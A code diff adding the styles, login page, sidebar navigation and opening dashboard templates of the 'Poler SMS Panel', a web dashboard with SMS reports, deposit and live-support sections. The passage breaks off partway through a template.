+            align-items: center;
+        }
+        .input-with-icon input {
+            width: 100%; /* Ensure input takes full width of its container */
+            padding-right: 35px; /* Make space for the icon */
+        }
+        .input-with-icon i {
+            position: absolute;
+            right: 12px;
+            color: #888;
+            pointer-events: none; /* Allows clicks to pass through to the input */
+            font-size: 16px; /* Adjust icon size */
+        }
+        /* Specific adjustment for search input wrapper in test panel to prevent overflow */
+        .test-panel-controls .search-input-wrapper {
+            flex-grow: 1;
+            min-width: 150px; /* Ensure it doesn't get too small */
+        }
+        
+        .sms-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--component-bg);
+            font-size: 14px;
+        }
+        
+        .sms-table th {
+            background: var(--table-header-bg);
+            color: var(--text-color);
+            padding: 10px 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .sms-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .sms-table th, .sms-table td {
+            white-space: nowrap;
+        }
+        
+        .pagination {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .pagination-info {
+            font-size: 14px;
+            color: #888;
+        }
+        
+        .pagination-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+
+        .pagination-controls button {
+            padding: 5px 10px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .pagination-controls button:hover {
+            background: var(--border-color);
+        }
+        .pagination-controls button.active {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+        .pagination-controls button:disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        /* SMS Reports Section Styles */
+        #sms-reports-container p, #sms-range-container p {
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: var(--text-color);
+        }
+        .report-filters {
+            background-color: var(--component-bg);
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .filter-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+        }
+        .filter-row input[type="text"], .filter-row select, .filter-row input[type="date"] {
+            padding: 8px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            flex-grow: 1;
+        }
+        .group-by-label {
+            font-weight: 500;
+            margin-right: 5px;
+        }
+        .group-by-options {
+            display: flex;
+            flex-wrap: wrap; /* Allow wrapping for small screens */
+            gap: 15px;
+            align-items: center;
+        }
+        .group-by-options label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 400;
+        }
+        .report-actions {
+            margin-left: auto;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .report-actions button {
+            padding: 8px 20px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-weight: 500;
+            transition: opacity 0.2s;
+        }
+        .report-actions button:hover {
+            opacity: 0.9;
+        }
+        .btn-export {
+            background-color: #f0ad4e;
+        }
+        .btn-show {
+            background-color: var(--secondary);
+        }
+        .sms-cdr-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        
+        /* Deposit Section Styles - UPDATED for a more prominent "frame" look */
+        .deposit-box {
+            background: var(--component-bg);
+            padding: 35px;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px var(--shadow-color);
+            max-width: 550px;
+            margin: 30px auto;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+        .deposit-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 8px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-top-left-radius: 18px;
+            border-top-right-radius: 18px;
+        }
+
+        .deposit-logo {
+            height: 70px;
+            margin-bottom: 30px;
+            transition: opacity 0.3s ease-in-out;
+            filter: invert(0);
+        }
+        body.dark-mode .deposit-logo {
+            filter: invert(1);
+        }
+
+        .deposit-box label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--text-color);
+            font-size: 17px;
+            text-align: left;
+        }
+
+        .select-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 25px;
+        }
+
+        .select-wrapper::after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 50%;
+            right: 18px;
+            transform: translateY(-50%);
+            pointer-events: none;
+            color: var(--primary);
+            font-size: 18px;
+        }
+
+        .deposit-box select {
+            width: 100%;
+            padding: 15px 18px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            appearance: none;
+            -webkit-appearance: none;
+            background: var(--input-bg);
+            color: var(--text-color);
+            cursor: pointer;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .deposit-box select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(106, 17, 203, 0.2), inset 0 2px 5px rgba(0,0,0,0.05);
+            outline: none;
+        }
+
+        .network-details {
+            margin-top: 25px;
+            padding: 20px;
+            background: var(--input-bg);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            text-align: left;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.03);
+        }
+
+        .network-details p {
+            margin-bottom: 12px;
+            font-weight: 700;
+            color: var(--text-color);
+            font-size: 15px;
+        }
+        .network-details .info-small {
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+            font-weight: 400;
+        }
+
+        .address-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #eef2f5;
+            padding: 12px 15px;
+            border-radius: 8px;
+            font-family: 'Roboto Mono', monospace;
+            word-break: break-all;
+            font-size: 14px;
+            border: 1px solid var(--border-color);
+            color: #333;
+        }
+        body.dark-mode .address-box {
+            background: #4a4b4c;
+            color: #f1f1f1;
+        }
+
+        .address-box .copy-btn {
+            background: none;
+            border: none;
+            color: var(--primary);
+            cursor: pointer;
+            font-size: 20px;
+            margin-left: 15px;
+            transition: color 0.2s ease, transform 0.2s ease;
+        }
+        
+        .address-box .copy-btn:hover {
+            color: var(--secondary);
+            transform: scale(1.1);
+        }
+
+        .amount-section {
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .info-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background-color: rgba(246, 211, 101, 0.2);
+            color: #8a6d3b;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(246, 211, 101, 0.7);
+            font-size: 15px;
+            font-weight: 500;
+        }
+        body.dark-mode .info-box {
+             color: #f8d879;
+        }
+        .info-box i {
+            font-size: 20px;
+            color: #d1a52e;
+        }
+
+        .deposit-box input[type="number"],
+        .deposit-box input[type="text"] {
+            width: 100%;
+            padding: 15px 18px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+            background-color: var(--input-bg);
+            color: var(--text-color);
+        }
+        .deposit-box input[type="number"]:focus,
+        .deposit-box input[type="text"]:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(106, 17, 203, 0.2), inset 0 2px 5px rgba(0,0,0,0.05);
+            outline: none;
+        }
+        
+        #deposit-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, var(--success), #28a745);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 19px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            margin-top: 15px;
+            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.25);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        #deposit-button:hover {
+            transform: translateY(-3px) scale(1.01);
+            box-shadow: 0 12px 30px rgba(40, 167, 69, 0.4);
+            filter: brightness(1.05);
+        }
+
+        #deposit-button:disabled {
+            background: #aaa;
+            cursor: not-allowed;
+            box-shadow: 0 4px 10px var(--shadow-color);
+        }
+
+        .deposit-message {
+            margin-top: 20px;
+            font-weight: 600;
+            height: 25px;
+            text-align: center;
+            transition: color 0.3s;
+            font-size: 15px;
+        }
+
+        /* Processing Animation */
+        #deposit-button.processing {
+            animation: glowing 1.5s infinite ease-in-out;
+        }
+
+        @keyframes glowing {
+            0% { box-shadow: 0 0 8px rgba(40, 167, 69, 0.5), 0 0 15px rgba(40, 167, 69, 0.3); }
+            50% { box-shadow: 0 0 25px rgba(40, 167, 69, 0.8), 0 0 40px rgba(40, 167, 69, 0.6); }
+            100% { box-shadow: 0 0 8px rgba(40, 167, 69, 0.5), 0 0 15px rgba(40, 167, 69, 0.3); }
+        }
+
+        /* History Section */
+        .history-container {
+            background: var(--component-bg);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            max-width: 900px;
+            margin: 40px auto;
+        }
+        .history-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        .status-completed {
+            color: var(--success);
+            font-weight: 600;
+        }
+        .status-pending {
+            color: var(--warning);
+            font-weight: 600;
+        }
+        .status-failed {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        /* New AI Robot SMS Styles */
+        .ai-robot-sms-grid {
+            display: grid;
+            grid-template-columns: 1fr; /* Default to single column */
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        @media (min-width: 768px) {
+            .ai-robot-sms-grid {
+                grid-template-columns: 1fr 1fr; /* 2 columns on medium screens */
+            }
+        }
+        @media (min-width: 1024px) { /* Adjust for 3 columns on larger screens */
+            .ai-robot-sms-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+            }
+        }
+
+        .ai-feature-box {
+            background: var(--component-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            padding: 30px;
+            border: 1px solid var(--border-color);
+        }
+        .ai-feature-box h3 {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .ai-feature-box h3 .active-dot {
+            width: 10px;
+            height: 10px;
+            background-color: var(--success);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 0 2px rgba(56, 239, 125, 0.4);
+        }
+        .ai-feature-box input[type="text"],
+        .ai-feature-box input[type="number"] {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 15px;
+            background: var(--input-bg);
+            color: var(--text-color);
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+        /* Custom styling for file input to make it look like a button/icon */
+        .ai-feature-box input[type="file"] {
+            display: none; /* Hide default file input */
+        }
+        .ai-feature-box .file-input-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            background: var(--input-bg);
+            color: var(--text-color);
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .ai-feature-box .file-input-label:hover {
+            background: var(--border-color);
+        }
+        .ai-feature-box .file-input-label i {
+            color: var(--secondary);
+            font-size: 16px;
+        }
+
+        .ai-feature-box button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+        .ai-feature-box button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+        }
+        .ai-response-message {
+            margin-top: 15px;
+            min-height: 40px; /* Ensure space even when empty */
+            padding: 10px;
+            border-radius: 8px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            font-size: 15px;
+            color: var(--text-color);
+            white-space: pre-wrap; /* Preserve newlines */
+            word-break: break-word; /* Ensure long words break */
+        }
+        .ai-response-message.success {
+            color: var(--success);
+            border-color: var(--success);
+        }
+        .ai-response-message.error {
+            color: var(--danger);
+            border-color: var(--danger);
+        }
+
+        /* Live Chat Window */
+        .live-chat-window {
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px var(--shadow-color);
+            background: var(--component-bg);
+        }
+        .chat-header {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            padding: 15px 20px;
+            font-weight: 600;
+            font-size: 18px;
+            text-align: center;
+            display: flex; /* For aligning active dot */
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .chat-header .active-dot {
+            width: 10px;
+            height: 10px;
+            background-color: var(--success);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 0 2px rgba(56, 239, 125, 0.4);
+        }
+        .chat-header .agent-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 10px;
+            border: 2px solid white;
+        }
+        .chat-header .agent-info {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .chat-header .agent-info #current-agent-name {
+            font-size: 19px;
+            font-weight: 700;
+        }
+
+        .chat-messages {
+            flex-grow: 1;
+            padding: 15px;
+            overflow-y: auto;
+            background: var(--input-bg); /* Lighter background for messages */
+            border-bottom: 1px solid var(--border-color);
+            display: flex; /* Make it a flex container to align messages */
+            flex-direction: column;
+        }
+        .chat-message {
+            margin-bottom: 12px; /* Slightly more space between messages */
+            padding: 10px 15px; /* Increased padding */
+            border-radius: 18px; /* Slightly larger radius */
+            font-size: 15px; /* Ensure good readability */
+            line-height: 1.4;
+            word-wrap: break-word;
+            position: relative; /* For sender name */
+        }
+        .chat-message .sender-name {
+            font-size: 12px; /* Keep sender name small but clear */
+            font-weight: 600;
+            margin-bottom: 4px;
+            opacity: 0.8;
+            display: block;
+        }
+        .chat-message.user {
+            background-color: var(--primary);
+            color: white;
+            align-self: flex-end; /* Push to right */
+            margin-left: auto;
+            border-bottom-right-radius: 2px; /* Slight corner adjustment */
+        }
+        .chat-message.ai, .chat-message.support {
+            background-color: var(--table-header-bg); /* Use table header bg for AI/Support */
+            color: var(--text-color);
+            align-self: flex-start; /* Push to left */
+            margin-right: auto;
+            border-bottom-left-radius: 2px; /* Slight corner adjustment */
+        }
+        body.dark-mode .chat-message.ai, body.dark-mode .chat-message.support {
+            background-color: var(--border-color);
+        }
+        .chat-input-area {
+            display: flex;
+            flex-direction: column; /* Changed to column for suggested messages */
+            padding: 15px;
+            gap: 10px;
+            border-top: 1px solid var(--border-color);
+            /* align-items: center; /* Align items vertically */
+        }
+        .suggested-messages {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px; /* Slightly increased gap */
+            margin-bottom: 12px; /* Space between suggestions and input */
+        }
+        .suggested-messages button {
+            background-color: #e0e0e0;
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+            padding: 8px 15px; /* Increased padding */
+            border-radius: 20px; /* More pill-shaped */
+            font-size: 14px; /* Increased font size */
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.2s;
+            flex-grow: 1; /* Allow buttons to grow to fill space */
+            max-width: fit-content; /* Prevent them from stretching too much */
+        }
+        body.dark-mode .suggested-messages button {
+            background-color: var(--border-color);
+            color: var(--text-color);
+        }
+        .suggested-messages button:hover {
+            background-color: #d0d0d0;
+            transform: translateY(-1px);
+        }
+        body.dark-mode .suggested-messages button:hover {
+            background-color: #555;
+        }
+
+        .chat-input-controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            width: 100%; /* Ensure it takes full width */
+        }
+
+        .chat-input-area input[type="text"] {
+            flex-grow: 1;
+            padding: 10px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            background: var(--input-bg);
+            color: var(--text-color);
+            margin-bottom: 0; /* Override default input margin */
+        }
+        .chat-input-area .file-input-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .chat-input-area .file-input-wrapper label {
+            /* Inherit common label styles if needed, or define specifically */
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 20px; /* Make it round like the send button */
+            background: var(--input-bg);
+            color: var(--text-color);
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        .chat-input-area .file-input-wrapper label:hover {
+            background: var(--border-color);
+        }
+        .chat-input-area .file-input-wrapper i {
+            color: var(--primary);
+            font-size: 16px;
+        }
+        .chat-input-area button.send-button { /* Added class to differentiate */
+            padding: 10px 20px;
+            background: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .chat-input-area button.send-button:hover {
+            background: var(--primary);
+        }
+
+        /* Copyright Footer */
+        .copyright-footer {
+            margin-top: auto; /* Push footer to the bottom */
+            padding: 15px;
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-color);
+            background: var(--component-bg);
+            border-top: 1px solid var(--border-color);
+        }
+
+        /* Live Support Floating Button */
+        #liveSupportFloatingButton { /* Renamed ID from aiFloatingButton */
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: linear-gradient(135deg, #a745ff, #6a11cb); /* Purple gradient */
+            color: white;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease-in-out;
+            border: 3px solid rgba(255, 255, 255, 0.5); /* White border for emphasis */
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            line-height: 1.2;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+            text-transform: uppercase;
+        }
+
+        #liveSupportFloatingButton:hover { /* Renamed ID from aiFloatingButton */
+            transform: scale(1.08) translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, #b05bff, #7a22dc); /* Slightly lighter on hover */
+        }
+
+        #liveSupportFloatingButton i { /* Renamed ID from aiFloatingButton */
+            font-size: 24px;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.2));
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .sms-test-wrapper {
+                grid-template-columns: 1fr;
+            }
+            .main-content.shifted {
+                margin-left: 0;
+            }
+        }
+        @media (max-width: 768px) {
+            .main-content.shifted {
+                margin-left: 0;
+            }
+            
+            .nav-button {
+                padding: 20px;
+            }
+            
+            .sms-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .table-actions {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .range-selector, .data-actions {
+                width: 100%;
+            }
+            
+            .data-actions {
+                margin-top: 10px;
+            }
+            /* Adjust deposit box for smaller screens */
+            .deposit-box {
+                padding: 25px;
+                border-radius: 15px;
+            }
+            .deposit-box::before {
+                height: 5px;
+            }
+
+            .group-by-options {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .report-actions {
+                justify-content: flex-start;
+                margin-left: 0;
+                width: 100%;
+            }
+            .ai-robot-sms-grid {
+                grid-template-columns: 1fr; /* Stack on small screens */
+            }
+            #liveSupportFloatingButton { /* Adjust floating button for smaller screens */
+                width: 60px;
+                height: 60px;
+                font-size: 10px;
+            }
+            #liveSupportFloatingButton i {
+                font-size: 20px;
+            }
+            .chat-input-area .file-input-wrapper label { /* Adjust file input labels for smaller screens */
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            .chat-input-area .file-input-wrapper i {
+                font-size: 14px;
+            }
+             .chat-input-area .suggested-messages button {
+                padding: 4px 8px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Page -->
+    <div id="login-container">
+        <div class="login-box">
+            <div class="login-box-header">
+                <p class="welcome-text">Welcome to</p>
+                <h2>Poler SMS Panel</h2>
+                <div class="lock-icon-circle"><i class="fas fa-lock"></i></div>
+            </div>
+            <div class="login-box-body">
+                <form id="login-form">
+                    <input type="text" id="username" placeholder="Username" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <!-- "Keep me logged in" checkbox removed as per request -->
+                    <!-- === CAPTCHA ELEMENT ADDED BACK HERE === -->
+                    <div class="captcha" id="captchaQuestion"></div>
+                    <input type="text" id="captcha-answer" placeholder="Answer" required>
+                    <button type="submit">LOGIN</button>
+                </form>
+                <!-- Error Support Message -->
+                <div id="support-message-on-error" class="error-support-message" style="display: none;">
+                    <p><i class="fas fa-exclamation-circle"></i> Please contact our support for assistance:</p>
+                    <a href="https://www.facebook.com/share/1JQVi7e7En/" target="_blank">
+                        <i class="fab fa-facebook"></i> Facebook Support
+                    </a>
+                </div>
+                <!-- General Support Link -->
+                <div class="support-login-link">
+                    <p>Need assistance? <a href="mailto:charlesjames997@outlook.com"><i class="fas fa-headset"></i> Contact Support</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Global elements outside the content wrapper -->
+    <button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button> <!-- Added fas fa-bars icon -->
+    <div class="sidebar" id="sidebar">
+        <!-- User Profile Frame -->
+        <div class="user-profile-frame">
+            <div class="profile-top-row">
+                <h4 id="sidebar-username">Admin</h4>
+                <span class="panel-tag">AGENT PANEL</span>
+            </div>
+            <p id="sidebar-userid"><i class="fas fa-id-badge"></i> Agent ID: 5890937</p>
+            <!-- NEW: Balance in Sidebar -->
+            <p class="balance-text"><i class="fas fa-dollar-sign"></i> Balance: <span id="sidebar-balance-amount">0.00</span></p>
+        </div>
+
+        <h3>Navigation</h3>
+        <ul>
+            <li class="active" data-section="dashboard"><i class="fas fa-home"></i> Dashboard</li>
+            <li data-section="sms-range"><i class="fas fa-list"></i> SMS Range</li>
+            <li data-section="sms-number"><i class="fas fa-mobile-alt"></i> SMS Number</li>
+            <li data-section="sms-reports"><i class="fas fa-chart-bar"></i> SMS Reports</li>
+            <li data-section="deposit"><i class="fas fa-wallet"></i> Deposit</li>
+            <li data-section="sms-test"><i class="fas fa-vial"></i> SMS Test Panel</li>
+            <li data-section="ai-robot-sms"><i class="fas fa-headset"></i> Live Support</li> <!-- Changed to Live Support & headset icon -->
+            
+            <!-- Dark Mode Toggle (now wrapped in li for proper flexbox behavior) -->
+            <li class="theme-switch-wrapper-li">
+                <div class="theme-switch-wrapper">
+                    <label class="theme-switch" for="dark-mode-toggle">
+                        <input type="checkbox" id="dark-mode-toggle" />
+                        <div class="slider round"></div>
+                    </label>
+                    <span>Dark Mode</span>
+                </div>
+            </li>
+            <!-- Social Support Links (Framed) -->
+            <li class="social-support-link">
+                <a href="https://www.facebook.com/share/1JQVi7e7En/" target="_blank" title="Contact us on Facebook">
+                    <i class="fab fa-facebook"></i> Facebook
+                </a>
+            </li>
+            <li class="social-support-link">
+                <a href="mailto:charlesjames997@outlook.com" title="Chat on Skype">
+                    <i class="fab fa-skype"></i> Skype
+                </a>
+            </li>
+            <li class="sign-out" id="signOut"><i class="fas fa-sign-out-alt"></i> Sign Out</li>
+        </ul>
+    </div>
+
+    <!-- Main Content Wrapper -->
+    <div class="main-content" id="main-content-wrapper" style="display:none;">
+        <div id="dashboard-container" class="container"></div>
+        <div id="sms-number-container" class="container"></div>
+        <div id="sms-range-container" class="container"></div>
+        <div id="sms-reports-container" class="container"></div>
+        <div id="deposit-container" class="container"></div>
+        <div id="sms-test-container" class="container"></div>
+        <div id="ai-robot-sms-container" class="container"></div> <!-- Renamed container to match Live Support concept -->
+    </div>
+
+    <!-- Live Support Floating Button -->
+    <div id="liveSupportFloatingButton" style="display:none;"> <!-- Renamed ID from aiFloatingButton -->
+        <i class="fas fa-headset"></i> <!-- Changed to headset icon -->
+        Live Support <!-- Changed to Live Support -->
+    </div>
+
+    <!-- Copyright Footer -->
+    <footer class="copyright-footer">
+        <p>&copy; 2025 Poler SMS. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // --- IMMEDIATE THEME APPLY SCRIPT ---
+        (function() {
+            const theme = localStorage.getItem('theme');
+            if (theme === 'dark') {
+                document.body.classList.add('dark-mode');
+            }
+        })();
+    </script>
+    <script>
+        // --- Global variable to store the selected female voice ---
+        let femaleVoice = null;
+
+        // --- Function to load and select a female voice ---
+        function loadVoices() {
+            const voices = speechSynthesis.getVoices();
+            // Prioritize higher quality or common female voices for English (en-US)
+            femaleVoice = voices.find(voice => 
+                (voice.lang === 'en-US' && (
+                    voice.name.includes('Google US English Female') || 
+                    voice.name.includes('Zira') || 
+                    voice.name.includes('Samantha') ||
+                    voice.name.includes('Female')
+                ))
+            ) || null;
+            
+            // Fallback: any English female voice
+            if (!femaleVoice) {
+                femaleVoice = voices.find(voice => 
+                    voice.lang.startsWith('en') && 
+                    (voice.name.toLowerCase().includes('female') || voice.name.toLowerCase().includes('girl'))
+                ) || null;
+            }
+            // Final fallback: any English voice, or the very first available voice
+            if (!femaleVoice) {
+                femaleVoice = voices.find(voice => voice.lang.startsWith('en')) || voices[0]; 
+            }
+            console.log("Selected voice for greeting:", femaleVoice ? femaleVoice.name : "None found, using system default if available.");
+        }
+
+        // Call loadVoices when voices are ready (important for browser compatibility)
+        // This event fires when the list of SpeechSynthesisVoice objects changes.
+        if (speechSynthesis.onvoiceschanged !== undefined) {
+            speechSynthesis.onvoiceschanged = loadVoices;
+        }
+        // Also try to load immediately, in case voices are already loaded or event doesn't fire
+        loadVoices();
+
+        // --- CAPTCHA LOGIC ---
+        let currentCaptcha;
+        function generateCaptcha() {
+            const num1 = Math.floor(Math.random() * 10) + 1;
+            const num2 = Math.floor(Math.random() * 10) + 1;
+            currentCaptcha = {
+                question: `What is ${num1} + ${num2} = ?`,
+                answer: (num1 + num2).toString()
+            };
+            document.getElementById('captchaQuestion').textContent = currentCaptcha.question;
+        }
+        // Call generateCaptcha immediately when this script block executes
+        generateCaptcha();
+
+
+        // --- TEMPLATES for dynamic content ---
+        const templates = {
+            dashboard: `
+                <div class="header"><h1>Poler SMS</h1></div>
+                <h2 class="dashboard-title">SMS Dashboard</h2>
+                <p style="margin-bottom: 25px; color: #666; font-weight: 500;">View Summarized Stats & Reports</p>
+                <div class="nav-buttons-container">
+                    <div class="nav-button" data-section="dashboard"><i class="fas fa-tachometer-alt"></i><h3>Dashboard</h3></div>
+                    <div class="nav-button" data-section="sms-range"><i class="fas fa-list-ol"></i><h3>SMS Range</h3></div>
+                    <div class="nav-button" data-section="sms-number"><i class="fas fa-mobile-alt"></i><h3>SMS Number</h3></div>
+                    <div class="nav-button" data-section="sms-reports"><i class="fas fa-chart-bar"></i><h3>SMS Reports</h3></div>
+                    <div class="nav-button" data-section="deposit"><i class="fas fa-wallet"></i><h3>Deposit</h3></div>
+                    <div class="nav-button" data-section="ai-robot-sms"><i class="fas fa-headset"></i><h3>Live Support</h3></div> 
+                </div>
+                
+                <!-- NEW STATS & CHART SECTION -->
+                <div class="stats-and-chart-container">
+                    <div class="stats-grid">
+                        <div class="stat-box">
+                            <div class="stat-box-left">
+                                <div class="stat-icon"><i class="fas fa-comment-dots"></i></div>
+                                <div class="stat-info">
+                                    <h5>Today SMS</h5>
+                                    <p id="today-sms-count">0</p>
+                                </div>
+                            </div>
+                            <div class="stat-trend"><i class="fas fa-arrow-up"></i></div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-box-left">
+                                <div class="stat-icon"><i class="fas fa-calendar-week"></i></div>
+                                <div class="stat-info">
+                                    <h5>Last 7 Day SMS</h5>
+                                    <p id="seven-day-sms-count">0</p>
+                                </div>
+                            </div>
+                            <div class="stat-trend"><i class="fas fa-arrow-up"></i></div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-box-left">
+                                <div class="stat-icon"><i class="fas fa-calendar-alt"></i></div>
+                                <div class="stat-info">
+                                    <h5>Last 30 Day SMS</h5>
+                                    <p id="thirty-day-sms-count">0</p>
+                                </div>
+                            </div>
+                            <div class="stat-trend"><i class="fas fa-arrow-up"></i></div>
+                        </div>
+                        <!-- NEW: Total Deposited Amount -->
+                        <div class="stat-box">
+                            <div class="stat-box-left">
+                                <div class="stat-icon" style="color: var(--success);"><i class="fas fa-dollar-sign"></i></div>
+                                <div class="stat-info">
+                                    <h5>Total Deposited</h5>
+                                    <p id="total-deposited-amount">0.00</p>
+                                </div>
+                            </div>
+                            <div class="stat-trend"><i class="fas fa-arrow-up"></i></div>
+                        </div>
+                    </div>
+                    <div class="chart-container">
+                        <canvas id="smsChart"></canvas>
+                    </div>
+                </div>
+
+                <div class="live-sms-container">
+                    <div class="live-sms-header">
+                        <h3 class="live-sms-title">LIVE SMS <span class="live-indicator"></span></h3>
+                        <button class="refresh-btn" id="refreshSms"><i class="fas fa-sync-alt"></i> Refresh</button>
+                    </div>
+                    <div class="sms-platforms" style="display: none;"></div>
+                    <div class="live-sms-list" id="smsList"></div>
+                </div>`,
+            smsNumber: `
+                <div class="header"><h1>My SMS Numbers</h1><button class="back-to-dashboard"><i class="fas fa-arrow-left"></i> Back</button></div>
+                <div class="table-container">
